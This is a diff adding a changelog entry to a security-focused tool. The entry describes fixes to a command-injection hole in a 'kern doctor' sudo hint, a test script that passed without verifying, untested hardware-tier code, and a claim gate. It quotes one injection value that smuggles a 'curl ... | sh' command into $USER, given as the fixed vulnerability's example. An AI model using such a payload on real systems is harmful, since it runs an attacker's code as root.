@@ -15,6 +15,40 @@ is in the git history.
 
 ### Added
 
+- **Closing the GPU phase: a shell payload in a `sudo` hint, a second weak green, and the rules
+  written down.** A third review round plus a closing review, and everything either fixed or stated.
+
+  `kern doctor` interpolated `$USER` into a `sudo tee` command it invites the reader to paste. With
+  `USER='x; curl http://host/p | sh #'` it printed a line that runs an attacker's script as root,
+  from the tool someone ran to find out whether their machine is safe; an ANSI escape in the same
+  variable reached the terminal verbatim. `$USER` is environment, and a container, a CI runner or
+  `sudo -E` all get to set it. It is now an allowlist of the portable POSIX name set, falling back to
+  the numeric uid, which `/etc/subuid` accepts and which cannot carry a payload. This code predates
+  the GPU work and was read because of it.
+
+  `pentest-gpu-claims.sh` had a second way to exit 0 without verifying anything: the previous round
+  closed the missing-compiler case, and left the case where the probe builds and there is no openable
+  device node for it to interrogate. Same verdict now, exit 3, different reason. Verified by running
+  the suite in a mount namespace where every GPU node is `/dev/null`.
+
+  `TIER-HW` was a branch no test could reach, and its fail-closed behaviour was asserted in a comment.
+  Two tests now drive it with a synthetic device directory: one forces the promotion with garbage in
+  every neighbouring attribute, one asserts garbage everywhere with no partition link falls to
+  `TIER-SOFT` without panicking. The promotion itself still has no positive control, and SECURITY.md
+  now says so in prose along with the probe's AMD arm having never executed, because both were marked
+  in the source where a reader deciding whether to trust the verdict never looks.
+
+  `check_scope_toll` printed its measured median with no ceiling on the interpretation, so a loaded
+  host could report "at least 8472.3 ms" as though that were the cost of a systemd scope. The number
+  is still printed; above 250 ms, six times the worst host ever measured, it now carries the fact
+  that it is most likely measuring load.
+
+  The claim gate matched `TIER-HW ... enforce` in one direction only, so the reverse order was a
+  false negative, and it would have failed a document describing the gate itself. Both fixed, with a
+  positive control for each. And the three rules the whole phase was built on, which lived only in
+  commit messages, are now `CONTRIBUTING.md`: ship a tier only if the code can assign it, publish the
+  demonstration that a defence is not a boundary before announcing it, and hold a claim to its code
+  with a gate that has a sabotage test rather than with the discipline of whoever edits next.
 - **A second review round: a lying exit code, a green that verified nothing, and the MIG mapping
   settled from source.**
 
